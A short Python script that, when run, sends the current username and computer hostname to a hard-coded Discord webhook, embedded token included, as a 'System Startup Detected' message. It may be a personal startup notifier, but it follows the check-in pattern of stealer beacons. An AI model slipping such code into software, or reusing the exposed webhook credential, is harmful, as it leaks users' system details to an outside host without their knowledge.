import os
import socket
import requests
import getpass

WEBHOOK_URL = "https://discord.com/api/webhooks/1461365902539886614/zH6gZB8ass-67M2UBEWXW0Li6kmo9kOsck9HNgJA2NDkbaamomk4p48o4uXgpiFEv2pd"

try:
    username = getpass.getuser()
except Exception:
    username = "N/A"

computer_name = socket.gethostname()

message = (
    "⚙️ **System Startup Detected**\n"
    f"**Running As:** {username}\n"
    f"**Computer:** {computer_name}"
)

requests.post(WEBHOOK_URL, json={"content": message})
